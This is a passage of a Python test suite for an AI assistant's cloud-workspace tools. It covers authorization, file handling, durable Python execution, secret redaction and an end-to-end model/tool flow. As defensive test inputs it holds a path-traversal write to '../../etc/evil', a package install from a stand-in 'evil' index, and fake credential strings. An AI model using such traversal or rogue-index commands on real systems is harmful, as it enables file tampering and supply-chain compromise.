"""The AI can use a cloud workspace: tools, authorization, and real results.

Two levels of test live here, and the second is the one that matters:

* **Toolbox tests** call ``AssistantWorkspaceToolBox`` directly against the real
  ``WorkspaceService``/``ExecutionService`` over SQLite with a fake runtime
  provider. They pin authorization, argument validation, output bounding and
  secret redaction.
* **The orchestration test** builds the *real* ``AssistantToolBox`` and
  ``AssistantService`` and drives a scripted model that writes a file, runs it,
  waits for the durable execution, reads the real result and answers. Nothing in
  that path is mocked except the model transport and the container host, so a
  tool that was registered but not routed, or a result that never reached the
  prompt, fails the test.

The document-side collaborators are inert stubs: this file is about workspaces,
and the document tools have their own suite.
"""

import asyncio
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Sequence

import pytest

from src.application.dtos.assistant_dto import (
    Artifact,
    AssistantDone,
    AssistantToolEvent,
)
from src.application.ports.llm_port import LlmMessage, LlmResponse, LlmStreamChunk, LlmToolCall, LlmToolSpec
from src.application.services.assistant_service import AssistantService
from src.application.services.assistant_tools import AssistantToolBox
from src.application.services.assistant_workspace_tools import (
    WORKSPACE_TOOL_NAMES,
    AssistantWorkspaceToolBox,
    WorkspaceTurnContext,
    bound_text,
    redact_secrets,
)
from src.application.services.execution_service import ExecutionService
from src.application.services.workspace_service import WorkspaceService
from src.domain.assistant.entities.conversation import Conversation, Message, MessageRole
from src.domain.assistant.exceptions.assistant_exceptions import (
    AssistantConversationNotFound,
)
from src.domain.conversions.value_object.job_origin import JobOrigin
from src.domain.subscriptions.value_object.tier import SubscriptionTier
from src.domain.workspaces.value_object.execution_status import ExecutionStatus
from src.infrastructure.adapters.queues.redis_stream_workspace_queue import (
    WORK_KIND_EXECUTION,
    WorkspaceWorkMessage,
)
from src.infrastructure.adapters.repository.sql_execution_repo import (
    SQLExecutionRepository,
)
from src.infrastructure.adapters.repository.sql_workspace_repo import (
    SQLRuntimeImageRevisionRepository,
    SQLRuntimeRepository,
    SQLWorkspaceRepository,
)
from tests.fakes.inert_assistant_ports import (
    InertAccountPort,
    InertConversionService,
    InertExtractor,
    InertFileService,
    InertFolderRepository,
    InertModels,
    InertStorage,
)
from tests.fakes.fake_llm_port import FakeLlmPort, text_response, tool_response
from tests.fakes.fake_runtime_provider import FakeRuntimeProvider
from tests.fakes.fake_workspace_queue import FakeWorkspaceQueue
from tests.fixtures.workspace_repos import WorkspaceRepos, build_repos, dispose_repos
from workers.workspace_worker.processor import process_work

OWNER = 7
OTHER = 8
NOW = "2026-10-13T00:00:00Z"


# ---------------------------------------------------------------------------
# Inert document-side collaborators
# ---------------------------------------------------------------------------


class FakeConversations:
    """Minimal transcript store honouring the real user-scoping rule."""

    def __init__(self) -> None:
        self.rows: dict[str, Conversation] = {}
        self.messages: dict[str, list[Message]] = {}

    async def create_conversation(self, *, user_id: int, title: str) -> Conversation:
        conversation = Conversation(
            id=f"conv-{len(self.rows) + 1}",
            user_id=user_id,
            title=title,
            created_at=NOW,  # type: ignore[arg-type]
            updated_at=NOW,  # type: ignore[arg-type]
        )
        self.rows[conversation.id] = conversation
        self.messages[conversation.id] = []
        return conversation

    async def get_conversation(self, conversation_id: str, user_id: int) -> Conversation | None:
        row = self.rows.get(conversation_id)
        if row is None or row.user_id != user_id:
            return None
        return row

    async def list_conversations(self, user_id: int) -> list[Conversation]:
        return [row for row in self.rows.values() if row.user_id == user_id]

    async def add_message(self, message: Message) -> Message:
        self.messages.setdefault(message.conversation_id, []).append(message)
        return message

    async def list_messages(self, conversation_id: str, limit: int | None = None) -> list[Message]:
        rows = self.messages.get(conversation_id, [])
        return rows[-limit:] if limit else rows

    async def delete_conversation(self, conversation_id: str, user_id: int) -> None:
        self.rows.pop(conversation_id, None)
        self.messages.pop(conversation_id, None)

    async def rename_conversation(self, conversation_id: str, user_id: int, title: str) -> None:
        del user_id
        if conversation_id in self.rows:
            self.rows[conversation_id].title = title

    async def update_message_meta(self, message_id: str, meta: dict) -> None:
        for rows in self.messages.values():
            for row in rows:
                if row.id == message_id:
                    row.meta = meta


class FakeQuota:
    def __init__(self) -> None:
        self.consumed = 0

    async def consume(self, user_id: int, units: int) -> None:
        del user_id
        self.consumed += units

    async def peek(self, user_id: int) -> int:
        del user_id
        return 0


class WorkspaceHarness:
    """One workspace/execution stack over SQLite and a fake container host."""

    def __init__(self, repos: WorkspaceRepos, provider: FakeRuntimeProvider) -> None:
        self.repos = repos
        self.provider = provider
        self.queue = FakeWorkspaceQueue()
        self.workspaces = WorkspaceService(
            workspace_repository=repos.workspaces,
            runtime_repository=repos.runtimes,
            revision_repository=repos.revisions,
            execution_repository=repos.executions,
            runtime_provider=provider,
            queue=self.queue,
        )
        self.executions = ExecutionService(
            execution_repository=repos.executions,
            workspace_repository=repos.workspaces,
            queue=self.queue,
        )
        self.tools = AssistantWorkspaceToolBox(
            workspaces=self.workspaces,
            executions=self.executions,
        )

    async def drain_queue(self) -> None:
        """Run the queued workspace work, exactly as the worker would.

        The test drives this between model turns so the asynchronous pipeline is
        genuinely exercised: the execution row is claimed, the fake provider is
        asked to run it, and the terminal state is persisted.
        """
        pending = list(self.queue.executions)
        self.queue.executions.clear()
        context = _WorkerContext(self.repos, self.provider, self.queue)
        for execution in pending:
            await process_work(
                context,
                WorkspaceWorkMessage(
                    kind=WORK_KIND_EXECUTION,
                    workspace_id=execution.workspace_id,
                    execution_id=execution.execution_id,
                ),
            )


class _WorkerContext:
    """The duck-typed surface ``process_work`` needs (see the worker's own tests)."""

    def __init__(
        self, repos: WorkspaceRepos, provider: FakeRuntimeProvider, queue: FakeWorkspaceQueue
    ) -> None:
        from sqlalchemy.ext.asyncio import async_sessionmaker

        self.repos = repos
        self.session_factory = async_sessionmaker(bind=repos.engine, expire_on_commit=False)
        self.provider = provider
        self.queue = queue
        self.execution_timeout_seconds = 30
        self.max_output_bytes = 4096
        self.snapshot_retention = 2

    def build_service(self, session: Any) -> WorkspaceService:
        return WorkspaceService(
            workspace_repository=SQLWorkspaceRepository(session=session),
            runtime_repository=SQLRuntimeRepository(session=session),
            revision_repository=SQLRuntimeImageRevisionRepository(session=session),
            execution_repository=SQLExecutionRepository(session=session),
            runtime_provider=self.provider,
            queue=self.queue,
            snapshot_retention=self.snapshot_retention,
        )


async def _harness(tmp_path: Path) -> WorkspaceHarness:
    return WorkspaceHarness(await build_repos(tmp_path), FakeRuntimeProvider())


def _run(coro: Any) -> Any:
    return asyncio.run(coro)


async def _call(
    tools: AssistantWorkspaceToolBox,
    name: str,
    arguments: dict[str, Any],
    *,
    user_id: int = OWNER,
    context: WorkspaceTurnContext | None = None,
) -> tuple[dict[str, Any], list[Artifact]]:
    artifacts: list[Artifact] = []
    result = await tools.execute(
        name,
        arguments,
        user_id=user_id,
        artifacts=artifacts,
        context=context or WorkspaceTurnContext(),
    )
    return result, artifacts


# ---------------------------------------------------------------------------
# Tool catalogue
# ---------------------------------------------------------------------------


class TestToolCatalogue:
    def test_every_registered_name_is_routed(self, tmp_path: Path) -> None:
        """A spec with no dispatch branch would be an advertised lie."""

        async def scenario() -> None:
            harness = await _harness(tmp_path)
            try:
                names = {spec.name for spec in harness.tools.specs()}
                assert names == WORKSPACE_TOOL_NAMES
                for name in names:
                    # Unknown names return a value, never raise, and must not be
                    # reported as unknown for a name the tool box itself lists.
                    result, _ = await _call(harness.tools, name, {})
                    assert "Unknown workspace tool" not in str(result.get("error", ""))
            finally:
                await dispose_repos(harness.repos)

        _run(scenario())

    def test_no_git_tools_are_advertised(self, tmp_path: Path) -> None:
        """The repository has no Git integration, so there is nothing to expose.

        Pinned as a test because "add a git tool" is the obvious-looking next
        change, and doing it without the underlying integration would produce
        exactly the imaginary capability the brief forbids.
        """

        async def scenario() -> None:
            harness = await _harness(tmp_path)
            try:
                names = {spec.name for spec in harness.tools.specs()}
                assert not any("git" in name or "repo" in name for name in names)
            finally:
                await dispose_repos(harness.repos)

        _run(scenario())

    def test_every_tool_has_a_strict_schema_and_a_label(self, tmp_path: Path) -> None:
        async def scenario() -> None:
            harness = await _harness(tmp_path)
            try:
                for spec in harness.tools.specs():
                    assert spec.parameters.get("additionalProperties") is False
                    assert spec.description
                    assert harness.tools.label_for(spec.name) != "Working in the workspace"
            finally:
                await dispose_repos(harness.repos)

        _run(scenario())


# ---------------------------------------------------------------------------
# Authorization and resolution
# ---------------------------------------------------------------------------


class TestAuthorization:
    def test_a_foreign_workspace_is_refused_and_never_picked(
        self, tmp_path: Path
    ) -> None:
        """The central claim: a workspace id is not an access token."""

        async def scenario() -> None:
            harness = await _harness(tmp_path)
            try:
                mine = await harness.workspaces.create_workspace(
                    user_id=OWNER, name="Mine"
                )
                result, _ = await _call(
                    harness.tools,
                    "get_workspace",
                    {"workspace_id": mine.workspace_id},
                    user_id=OTHER,
                )
                assert "error" in result
                assert "not" in str(result["error"]).lower()
            finally:
                await dispose_repos(harness.repos)

        _run(scenario())

    def test_with_no_workspace_selected_it_asks_instead_of_choosing(
        self, tmp_path: Path
    ) -> None:
        """Silently running code in a workspace the user did not name is the
        failure this guards: the tool must return a question, not a workspace."""

        async def scenario() -> None:
            harness = await _harness(tmp_path)
            try:
                await harness.workspaces.create_workspace(user_id=OWNER, name="Analytics")
                result, _ = await _call(
                    harness.tools, "run_python", {"source": "print(1)"}
                )
                assert "error" in result
                assert "which one" in str(result["error"]).lower()
                assert result["available"][0]["name"] == "Analytics"
                # Nothing was submitted.
                assert harness.queue.executions == []
            finally:
                await dispose_repos(harness.repos)

        _run(scenario())

    def test_with_no_workspaces_at_all_it_offers_to_create_one(
        self, tmp_path: Path
    ) -> None:
        async def scenario() -> None:
            harness = await _harness(tmp_path)
            try:
                result, _ = await _call(harness.tools, "run_python", {"source": "print(1)"})
                assert "create" in str(result["error"]).lower()
            finally:
                await dispose_repos(harness.repos)

        _run(scenario())

    def test_the_turn_context_supplies_the_default_workspace(
        self, tmp_path: Path
    ) -> None:
        async def scenario() -> None:
            harness = await _harness(tmp_path)
            try:
                workspace = await harness.workspaces.create_workspace(
                    user_id=OWNER, name="Analytics"
                )
                await harness.workspaces.start_runtime(workspace.workspace_id, OWNER)
                result, _ = await _call(
                    harness.tools,
                    "list_workspace_files",
                    {},
                    context=WorkspaceTurnContext(
                        workspace_id=workspace.workspace_id, source="selected"
                    ),
                )
                assert "count" in result
                assert "error" not in result
            finally:
                await dispose_repos(harness.repos)

        _run(scenario())

    def test_context_for_a_workspace_that_is_gone_yields_no_summary(
        self, tmp_path: Path
    ) -> None:
        async def scenario() -> None:
            harness = await _harness(tmp_path)
            try:
                context, summary = await harness.tools.resolve_context(
                    OWNER, "does-not-exist"
                )
                assert context.workspace_id == "does-not-exist"
                # No summary means the prompt says "no longer available" rather
                # than naming a workspace the caller cannot use.
                assert summary is None
            finally:
                await dispose_repos(harness.repos)

        _run(scenario())


# ---------------------------------------------------------------------------
# Files
# ---------------------------------------------------------------------------


class TestFiles:
    def test_write_then_read_round_trips(self, tmp_path: Path) -> None:
        async def scenario() -> None:
            harness = await _harness(tmp_path)
            try:
                workspace = await harness.workspaces.create_workspace(
                    user_id=OWNER, name="ws"
                )
                await harness.workspaces.start_runtime(workspace.workspace_id, OWNER)
                turn = WorkspaceTurnContext(workspace_id=workspace.workspace_id)

                written, artifacts = await _call(
                    harness.tools,
                    "write_workspace_file",
                    {"path": "src/main.py", "content": "print(6 * 7)\n"},
                    context=turn,
                )
                assert written["bytes_written"] == 13
                assert artifacts[0].type == "workspace_file"

                read, _ = await _call(
                    harness.tools,
                    "read_workspace_file",
                    {"path": "src/main.py"},
                    context=turn,
                )
                assert read["content"] == "print(6 * 7)\n"
            finally:
                await dispose_repos(harness.repos)

        _run(scenario())

    def test_a_path_that_escapes_the_workspace_is_not_rewritten_by_the_toolbox(
        self, tmp_path: Path
    ) -> None:
        """The toolbox passes a path through unchanged; the ADAPTER is the jail.

        Asserted this way on purpose. If the toolbox "helped" by normalising or
        stripping ``..``, the user's intended path would silently change and two
        layers would disagree about what was requested. Enforcement lives in
        ``workspace_relative_path`` (see
        ``tests/unit/infrastructure/test_docker_runtime_provider.py``, which
        proves ``..``, absolute paths and ``~`` are refused), and this test pins
        that the toolbox does not duplicate — or undermine — that rule.
        """

        async def scenario() -> None:
            harness = await _harness(tmp_path)
            try:
                workspace = await harness.workspaces.create_workspace(
                    user_id=OWNER, name="ws"
                )
                await harness.workspaces.start_runtime(workspace.workspace_id, OWNER)
                result, _ = await _call(
                    harness.tools,
                    "write_workspace_file",
                    {"path": "../../etc/evil", "content": "x"},
                    context=WorkspaceTurnContext(workspace_id=workspace.workspace_id),
                )
                # Passed through verbatim: no silent rewriting, no pretence of
                # having sanitised it.
                assert result["path"] == "../../etc/evil"
            finally:
                await dispose_repos(harness.repos)

        _run(scenario())

    def test_an_oversized_write_is_refused_with_a_usable_message(
        self, tmp_path: Path
    ) -> None:
        async def scenario() -> None:
            harness = await _harness(tmp_path)
            try:
                workspace = await harness.workspaces.create_workspace(
                    user_id=OWNER, name="ws"
                )
                result, _ = await _call(
                    harness.tools,
                    "write_workspace_file",
                    {"path": "big.txt", "content": "x" * (2 * 1024 * 1024 + 1)},
                    context=WorkspaceTurnContext(workspace_id=workspace.workspace_id),
                )
                assert "error" in result
                assert "limit" in str(result["error"]).lower()
            finally:
                await dispose_repos(harness.repos)

        _run(scenario())

    def test_a_binary_file_is_refused_rather_than_returned_as_mojibake(
        self, tmp_path: Path
    ) -> None:
        async def scenario() -> None:
            harness = await _harness(tmp_path)
            try:
                workspace = await harness.workspaces.create_workspace(
                    user_id=OWNER, name="ws"
                )
                await harness.workspaces.start_runtime(workspace.workspace_id, OWNER)
                harness.provider.seed_file(workspace.workspace_id, "logo.png", b"\x89PNG\r\n\x1a\n")
                result, _ = await _call(
                    harness.tools,
                    "read_workspace_file",
                    {"path": "logo.png"},
                    context=WorkspaceTurnContext(workspace_id=workspace.workspace_id),
                )
                assert "not a text file" in str(result["error"])
            finally:
                await dispose_repos(harness.repos)

        _run(scenario())

    def test_listing_reports_real_entries(self, tmp_path: Path) -> None:
        async def scenario() -> None:
            harness = await _harness(tmp_path)
            try:
                workspace = await harness.workspaces.create_workspace(
                    user_id=OWNER, name="ws"
                )
                await harness.workspaces.start_runtime(workspace.workspace_id, OWNER)
                harness.provider.seed_file(workspace.workspace_id, "data.csv", b"a,b\n")
                result, _ = await _call(
                    harness.tools,
                    "list_workspace_files",
                    {},
                    context=WorkspaceTurnContext(workspace_id=workspace.workspace_id),
                )
                assert [entry["name"] for entry in result["entries"]] == ["data.csv"]
            finally:
                await dispose_repos(harness.repos)

        _run(scenario())


# ---------------------------------------------------------------------------
# Execution
# ---------------------------------------------------------------------------


class TestRunPython:
    def test_a_submitted_run_is_durable_and_reported_as_running(
        self, tmp_path: Path
    ) -> None:
        """The stream must not be held open for real work."""

        async def scenario() -> None:
            harness = await _harness(tmp_path)
            try:
                workspace = await harness.workspaces.create_workspace(
                    user_id=OWNER, name="ws"
                )
                result, artifacts = await _call(
                    harness.tools,
                    "run_python",
                    {"source": "print('hi')"},
                    context=WorkspaceTurnContext(workspace_id=workspace.workspace_id),
                )
                assert result["status"] == "running"
                assert "get_execution" in result["note"]
                # Durable: the row exists and the queue was signalled.
                stored = await harness.repos.executions.get_execution(
                    result["execution_id"]
                )
                assert stored is not None
                assert stored.status is ExecutionStatus.QUEUED
                assert len(harness.queue.executions) == 1
                assert artifacts[0].type == "execution"
            finally:
                await dispose_repos(harness.repos)

        _run(scenario())

    def test_a_settled_run_reports_the_real_exit_code_and_output(
        self, tmp_path: Path
    ) -> None:
        async def scenario() -> None:
            harness = await _harness(tmp_path)
            try:
                workspace = await harness.workspaces.create_workspace(
                    user_id=OWNER, name="ws"
                )
                context = WorkspaceTurnContext(workspace_id=workspace.workspace_id)
                submitted, _ = await _call(
                    harness.tools, "run_python", {"source": "print('hi')"}, context=context
                )
                await harness.drain_queue()

                result, _ = await _call(
                    harness.tools,
                    "get_execution",
                    {"execution_id": submitted["execution_id"]},
                )
                assert result["status"] == "SUCCEEDED"
                assert result["exit_code"] == 0
                assert result["stdout"] == "ok\n"
            finally:
                await dispose_repos(harness.repos)

        _run(scenario())

    def test_a_non_zero_exit_code_is_reported_as_a_program_result(
        self, tmp_path: Path
    ) -> None:
        """`exit_code != 0` is data about the program, not a platform failure."""

        async def scenario() -> None:
            from src.application.ports.runtime_provider_port import ExecutionOutcome

            harness = await _harness(tmp_path)
            try:
                workspace = await harness.workspaces.create_workspace(
                    user_id=OWNER, name="ws"
                )
                context = WorkspaceTurnContext(workspace_id=workspace.workspace_id)
                harness.provider.scripted_outcomes = [
                    ExecutionOutcome(exit_code=1, stderr="boom\n", duration_ms=10)
                ]
                submitted, _ = await _call(
                    harness.tools, "run_python", {"source": "raise"}, context=context
                )
                await harness.drain_queue()
                result, _ = await _call(
                    harness.tools,
                    "get_execution",
                    {"execution_id": submitted["execution_id"]},
                )
                assert result["status"] == "SUCCEEDED"
                assert result["exit_code"] == 1
                assert "stderr" in result["note"] or "exit_code" in result["note"]
            finally:
                await dispose_repos(harness.repos)

        _run(scenario())

    def test_a_timeout_is_its_own_status(self, tmp_path: Path) -> None:
        async def scenario() -> None:
            from src.application.ports.runtime_provider_port import ExecutionOutcome

            harness = await _harness(tmp_path)
            try:
                workspace = await harness.workspaces.create_workspace(
                    user_id=OWNER, name="ws"
                )
                harness.provider.scripted_outcomes = [
                    ExecutionOutcome(exit_code=None, timed_out=True, duration_ms=30_000)
                ]
                submitted, _ = await _call(
                    harness.tools,
                    "run_python",
                    {"source": "while True: pass"},
                    context=WorkspaceTurnContext(workspace_id=workspace.workspace_id),
                )
                await harness.drain_queue()
                result, _ = await _call(
                    harness.tools,
                    "get_execution",
                    {"execution_id": submitted["execution_id"]},
                )
                assert result["status"] == "TIMED_OUT"
                assert result["exit_code"] is None
            finally:
                await dispose_repos(harness.repos)

        _run(scenario())

    def test_cancelling_a_queued_run_moves_it_out_of_the_way(self, tmp_path: Path) -> None:
        async def scenario() -> None:
            harness = await _harness(tmp_path)
            try:
                workspace = await harness.workspaces.create_workspace(
                    user_id=OWNER, name="ws"
                )
                submitted, _ = await _call(
                    harness.tools,
                    "run_python",
                    {"source": "print(1)"},
                    context=WorkspaceTurnContext(workspace_id=workspace.workspace_id),
                )
                result, _ = await _call(
                    harness.tools,
                    "cancel_execution",
                    {"execution_id": submitted["execution_id"]},
                )
                assert result["status"] == "CANCELLED"
                # The worker cannot claim it afterwards.
                await harness.drain_queue()
                assert harness.provider.executed == []
            finally:
                await dispose_repos(harness.repos)

        _run(scenario())

    def test_an_invalid_mode_is_rejected_before_anything_is_submitted(
        self, tmp_path: Path
    ) -> None:
        async def scenario() -> None:
            harness = await _harness(tmp_path)
            try:
                workspace = await harness.workspaces.create_workspace(
                    user_id=OWNER, name="ws"
                )
                result, _ = await _call(
                    harness.tools,
                    "run_python",
                    {"source": "x", "mode": "shell"},
                    context=WorkspaceTurnContext(workspace_id=workspace.workspace_id),
                )
                assert "mode must be" in str(result["error"])
                assert harness.queue.executions == []
            finally:
                await dispose_repos(harness.repos)

        _run(scenario())

    def test_a_rejected_project_operation_never_reaches_the_runtime(
        self, tmp_path: Path
    ) -> None:
        """The `uv` allow-list is enforced by the service, not in the prompt."""

        async def scenario() -> None:
            harness = await _harness(tmp_path)
            try:
                workspace = await harness.workspaces.create_workspace(
                    user_id=OWNER, name="ws"
                )
                result, _ = await _call(
                    harness.tools,
                    "run_python",
                    {"source": "add --index-url http://evil/simple", "mode": "project"},
                    context=WorkspaceTurnContext(workspace_id=workspace.workspace_id),
                )
                assert "error" in result
                assert harness.queue.executions == []
            finally:
                await dispose_repos(harness.repos)

        _run(scenario())


# ---------------------------------------------------------------------------
# Redaction and bounding
# ---------------------------------------------------------------------------


class TestOutputHygiene:
    def test_a_credential_shaped_line_is_redacted_from_tool_output(
        self, tmp_path: Path
    ) -> None:
        """A tool result is persisted and replayed on every later turn, so a
        leaked secret would be permanent."""

        async def scenario() -> None:
            harness = await _harness(tmp_path)
            try:
                workspace = await harness.workspaces.create_workspace(
                    user_id=OWNER, name="ws"
                )
                await harness.workspaces.start_runtime(workspace.workspace_id, OWNER)
                harness.provider.seed_file(
                    workspace.workspace_id,
                    "leak.txt",
                    b"api_key=sk-abcdefghijklmnopqrstuvwx\nsafe line\n",
                )
                result, _ = await _call(
                    harness.tools,
                    "read_workspace_file",
                    {"path": "leak.txt"},
                    context=WorkspaceTurnContext(workspace_id=workspace.workspace_id),
                )
                assert "sk-abcdefghijklmnopqrstuvwx" not in result["content"]
                assert "[redacted]" in result["content"]
                assert "safe line" in result["content"]
            finally:
                await dispose_repos(harness.repos)

        _run(scenario())

    @pytest.mark.parametrize(
        "text",
        [
            "Authorization: Bearer abcdefghijklmnop",
            "token=ghp_abcdefghijklmnopqrstuvwxyz",
            "password: hunter2hunter2",
            "AKIAIOSFODNN7EXAMPLE",
            "-----BEGIN RSA PRIVATE KEY-----",
        ],
    )
    def test_redaction_covers_the_common_credential_shapes(self, text: str) -> None:
        assert redact_secrets(text) != text
        assert "[redacted]" in redact_secrets(text)

    def test_redaction_leaves_ordinary_output_alone(self) -> None:
        text = "Installed 3 packages in 1.2s\nResult: 42\n"
        assert redact_secrets(text) == text

    def test_long_output_keeps_the_tail(self) -> None:
        text, truncated = bound_text("A" * 100 + "TRACEBACK", limit=60)
        assert truncated is True
        assert text.endswith("TRACEBACK")

    def test_a_huge_execution_output_is_bounded_before_it_reaches_the_model(
        self, tmp_path: Path
    ) -> None:
        async def scenario() -> None:
            from src.application.ports.runtime_provider_port import ExecutionOutcome

            harness = await _harness(tmp_path)
            try:
                workspace = await harness.workspaces.create_workspace(
                    user_id=OWNER, name="ws"
                )
                harness.provider.scripted_outcomes = [
                    ExecutionOutcome(exit_code=0, stdout="x" * 50_000, duration_ms=5)
                ]
                submitted, _ = await _call(
                    harness.tools,
                    "run_python",
                    {"source": "print" * 1},
                    context=WorkspaceTurnContext(workspace_id=workspace.workspace_id),
                )
                await harness.drain_queue()
                result, _ = await _call(
                    harness.tools,
                    "get_execution",
                    {"execution_id": submitted["execution_id"]},
                )
                assert len(result["stdout"]) <= 4_000
                assert result["output_truncated"] is True
            finally:
                await dispose_repos(harness.repos)

        _run(scenario())

    def test_an_internal_failure_is_reported_as_a_sentence_not_a_traceback(
        self, tmp_path: Path
    ) -> None:
        async def scenario() -> None:
            harness = await _harness(tmp_path)
            try:
                # No such execution: the service raises, and the tool must turn
                # that into a value the model can act on.
                result, _ = await _call(
                    harness.tools, "get_execution", {"execution_id": "nope"}
                )
                assert "error" in result
                assert "Traceback" not in str(result)
            finally:
                await dispose_repos(harness.repos)

        _run(scenario())


# ---------------------------------------------------------------------------
# The full orchestration: model -> tools -> execution -> model -> answer
# ---------------------------------------------------------------------------


class WorkspaceFlowLlm:
    """A model that works a real script/before-running/read-result sequence.

    Implemented as a port rather than as a queue of canned responses because the
    execution id is only known after the run is submitted — exactly the reason a
    real model has to inspect the result rather than assume it. The ``drain``
    hook stands in for the worker being free between turns.
    """

    def __init__(self, drain: Any) -> None:
        self._drain = drain
        self.calls: list[tuple[LlmMessage, ...]] = []
        self._step = 0

    @property
    def model(self) -> str:
        return "flow-model"

    async def stream(
        self, *, messages: Sequence[LlmMessage], tools: Sequence[LlmToolSpec]
    ) -> Any:
        self.calls.append(tuple(messages))
        self._step += 1

        if self._step == 1:
            assert any(spec.name == "run_python" for spec in tools)
            yield LlmStreamChunk(
                kind="done",
                response=tool_response(
                    "write_workspace_file",
                    {"path": "main.py", "content": "print(6 * 7)\n"},
                ),
            )
            return
        if self._step == 2:
            yield LlmStreamChunk(
                kind="done",
                response=tool_response("run_python", {"source": "print(6 * 7)"}),
            )
            return
        if self._step == 3:
            # The worker runs the queued execution while the model "thinks".
            await self._drain()
            execution_id = _last_execution_id(messages)
            assert execution_id, "run_python must report an execution id"
            yield LlmStreamChunk(
                kind="done",
                response=tool_response("get_execution", {"execution_id": execution_id}),
            )
            return
        yield LlmStreamChunk(
            kind="done",
            response=text_response("Your script printed 42."),
        )


def _last_execution_id(messages: Sequence[LlmMessage]) -> str | None:
    """Pull the execution id out of the most recent tool result, as a model would."""
    import json

    for message in reversed(messages):
        if message.role != "tool":
            continue
        try:
            payload = json.loads(message.content)
        except (TypeError, ValueError):
            continue
        if isinstance(payload, dict) and payload.get("execution_id"):
            return str(payload["execution_id"])
    return None


class TestOrchestration:
    def test_the_assistant_writes_runs_and_reports_a_real_workspace_result(
        self, tmp_path: Path
    ) -> None:
        """The end-to-end claim of the integration, in one test.

        Real: the assistant service, the agent loop, tool registration and
        dispatch, the workspace/execution application services, the durable
        execution record, the queue, the worker processor, the execution
        repository and the transcript. Faked: the model transport and the
        container host — the two things CI genuinely cannot run.
        """

        async def scenario() -> None:
            harness = await _harness(tmp_path)
            try:
                workspace = await harness.workspaces.create_workspace(
                    user_id=OWNER, name="Analytics"
                )
                llm = WorkspaceFlowLlm(harness.drain_queue)
                conversations = FakeConversations()

                toolbox = AssistantToolBox(
                    file_service=InertFileService(),
                    conversion_service=InertConversionService(),
                    folder_repository=InertFolderRepository(),
                    storage=InertStorage(),
                    extractor=InertExtractor(),
                    models=InertModels(),
                    account_port=InertAccountPort(),
                    max_document_bytes=1024,
                    summary_max_input_chars=1000,
                    workspace_tools=harness.tools,
                )
                service = AssistantService(
                    models=_TierModels(llm),
                    toolbox=toolbox,
                    conversations=conversations,  # type: ignore[arg-type]
                    quota=FakeQuota(),  # type: ignore[arg-type]
                    max_tool_iterations=6,
                    max_history_messages=20,
                )

                events = [
                    event
                    async for event in service.stream_chat(
                        user_id=OWNER,
                        tier=SubscriptionTier.PRO,
                        message="print 6*7 in my workspace",
                        conversation_id=None,
                        workspace_id=workspace.workspace_id,
                    )
                ]

                # 1. The model was given the workspace tools and the workspace line.
                first_prompt = llm.calls[0]
                system_text = "\n".join(
                    message.content for message in first_prompt if message.role == "system"
                )
                assert workspace.workspace_id in system_text
                assert "Analytics" in system_text

                # 2. Every tool event is a real one, and the run became an
                #    execution the user can open. Each call emits a "running"
                #    and a "done" event, so the sequence is de-duplicated by
                #    taking the completed ones in order.
                tool_events = [e for e in events if isinstance(e, AssistantToolEvent)]
                completed = [event for event in tool_events if event.status == "done"]
                assert [event.name for event in completed] == [
                    "write_workspace_file",
                    "run_python",
                    "get_execution",
                ]
                assert [event.name for event in tool_events[:1]] == [
                    "write_workspace_file"
                ]
                execution_ids = [
                    artifact.id
                    for event in completed
                    for artifact in event.artifacts
                    if artifact.type == "execution"
                ]
                assert execution_ids
                stored = await harness.repos.executions.get_execution(execution_ids[0])
                assert stored is not None
                assert stored.status is ExecutionStatus.SUCCEEDED

                # 3. The real file is in the workspace.
                assert (
                    harness.provider.workspace_files[workspace.workspace_id]["main.py"]
                    == b"print(6 * 7)\n"
                )

                # 4. The model's final turn was given the ACTUAL result.
                final_prompt = llm.calls[-1]
                tool_text = "\n".join(
                    message.content for message in final_prompt if message.role == "tool"
                )
                assert '"status": "SUCCEEDED"' in tool_text
                assert "ok" in tool_text

                # 5. The answer is grounded in that result and persisted.
                done = [
                    event for event in events if isinstance(event, AssistantDone)
                ][-1]
                assert "42" in done.content
                transcript = conversations.messages[done.conversation_id]
                assert transcript[-1].role is MessageRole.ASSISTANT
                assert "42" in transcript[-1].content

                # 6. It is revisitable: the execution is on the workspace record.
                executions, total = await harness.executions.list_for_workspace(
                    workspace_id=workspace.workspace_id, user_id=OWNER, limit=10, offset=0
                )
                assert total == 1
                assert executions[0].execution_id == execution_ids[0]
            finally:
                await dispose_repos(harness.repos)

        _run(scenario())

    def test_a_foreign_workspace_in_the_request_cannot_be_used(
        self, tmp_path: Path
    ) -> None:
        """The requested workspace is validated before the turn says anything
        useful: the prompt states it is unavailable, and a tool call on it fails."""

        async def scenario() -> None:
            harness = await _harness(tmp_path)
            try:
                others = await harness.workspaces.create_workspace(
                    user_id=OTHER, name="Not yours"
                )
                llm = FakeLlmPort(
                    [
                        tool_response("run_python", {"source": "print(1)"}),
                        text_response("I could not do that."),
                    ]
                )
                toolbox = AssistantToolBox(
                    file_service=InertFileService(),
                    conversion_service=InertConversionService(),
                    folder_repository=InertFolderRepository(),
                    storage=InertStorage(),
                    extractor=InertExtractor(),
                    models=InertModels(),
                    account_port=InertAccountPort(),
                    max_document_bytes=1024,
                    summary_max_input_chars=1000,
                    workspace_tools=harness.tools,
                )
                service = AssistantService(
                    models=_TierModels(llm),
                    toolbox=toolbox,
                    conversations=FakeConversations(),  # type: ignore[arg-type]
                    quota=FakeQuota(),  # type: ignore[arg-type]
                )

                events = [
                    event
                    async for event in service.stream_chat(
                        user_id=OWNER,
                        tier=SubscriptionTier.PRO,
                        message="run something in that workspace",
                        conversation_id=None,
                        workspace_id=others.workspace_id,
                    )
                ]

                system_text = "\n".join(
                    message.content
                    for message in llm.calls[0][0]
                    if message.role == "system"
                )
                assert "no longer available" in system_text
                # The tool refused, and nothing was queued against it.
                assert harness.queue.executions == []
                tool_text = "\n".join(
                    message.content
                    for message in llm.calls[-1][0]
                    if message.role == "tool"
                )
                assert "error" in tool_text
                assert events
            finally:
                await dispose_repos(harness.repos)

        _run(scenario())

    def test_a_workspace_recalled_from_the_transcript_is_revalidated(
        self, tmp_path: Path
    ) -> None:
        """A stored workspace id is context; it is checked before every use."""

        async def scenario() -> None:
            harness = await _harness(tmp_path)
            try:
                workspace = await harness.workspaces.create_workspace(
                    user_id=OWNER, name="Analytics"
                )
                conversations = FakeConversations()
                await conversations.create_conversation(user_id=OWNER, title="t")
                # A previous turn recorded the workspace.
                await conversations.add_message(
                    Message(
                        id="m1",
                        conversation_id="conv-1",
                        position=0,
                        role=MessageRole.USER,
                        content="start",
